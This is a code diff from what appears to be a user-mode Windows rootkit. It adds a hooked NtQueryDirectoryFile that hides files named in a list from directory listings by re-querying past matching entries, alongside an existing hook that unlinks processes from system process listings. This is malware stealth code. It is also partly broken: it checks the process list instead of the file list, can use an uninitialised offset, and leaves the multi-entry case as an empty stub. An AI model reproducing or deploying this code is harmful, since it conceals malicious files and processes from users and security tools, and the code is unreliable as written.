@@ -2,6 +2,25 @@
 #include "riftrk.h"
 
 namespace hk {
+#pragma region NtQueryDirectoryFile
+	void* TranslateFICNameToPointer(
+		_In_ void* pData,
+		_In_ ulong fclass
+	) {
+		ptr offset;
+
+		switch (fclass) {
+		case nt::FileDirectoryInformation:       offset = 64; break;
+		case nt::FileFullDirectoryInformation:   offset = 68; break;
+		case nt::FileBothDirectoryInformation:   offset = 81; break;
+		case nt::FileNamesInformation:           offset = 12; break;
+		case nt::FileIdBothDirectoryInformation: offset = 89; break;
+		case nt::FileIdFullDirectoryInformation: offset = 76;
+		}
+
+		return (void*)((ptr)pData + offset);
+	}
+
 	nt::NtQueryDirectoryFile_t NtQueryDirectoryFile;
 	NTSTATUS NTAPI NtQueryDirectoryFileHook(
 		_In_                       HANDLE          FileHandle,
@@ -19,10 +38,47 @@ namespace hk {
 		NTSTATUS s = NtQueryDirectoryFile(FileHandle, Event, ApcRoutine,
 			ApcContext, IoStatusBlock, FileInformation, Length,
 			FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
+		if (!FileList.GetItemCount())
+			return s;
+
+		constexpr ulong fclass[] = {
+			nt::FileDirectoryInformation,
+			nt::FileFullDirectoryInformation,
+			nt::FileBothDirectoryInformation,
+			nt::FileNamesInformation,
+			nt::FileIdBothDirectoryInformation,
+			nt::FileIdFullDirectoryInformation
+		};
+		for (ulong i = 0; i < sizeof(fclass) / sizeof(*fclass); i++)
+			if (FileInformationClass == fclass[i]) {
+				FileList.ReadLock();
+				if (ReturnSingleEntry) {
+					// This Code Hides Single Entry Requests
+
+					const wchar* Entry = (wchar*)ProcessList.GetFirstEntry();
+					do {
+					RedoNext:
+						if (!_wcsicmp((const wchar*)TranslateFICNameToPointer(FileInformation, FileInformationClass), Entry)) {
+							s = NtQueryDirectoryFile(FileHandle, Event, ApcRoutine,
+								ApcContext, IoStatusBlock, FileInformation, Length,
+								FileInformationClass, ReturnSingleEntry, FileName, false);
+							goto RedoNext; // redo for next element
+						}
+					} while (Entry = (wchar*)ProcessList.GetNextEntry((void*)Entry));
+				} else {
+					// This Code will fully unlink Entries from a list of any size (to be imlemented)
+
+				}
+				FileList.ReadUnlock();
+
+				break;
+			}
 
 		return s;
 	}
+#pragma endregion
 
+#pragma region NtQuerySystemInformation
 	status UnlinkProcessEntry(
 		_In_ nt::SYSTEM_PROCESS_INFORMATION* spi
 	) {
@@ -115,4 +171,5 @@ namespace hk {
 
 		return s;
 	}
+#pragma endregion
 }
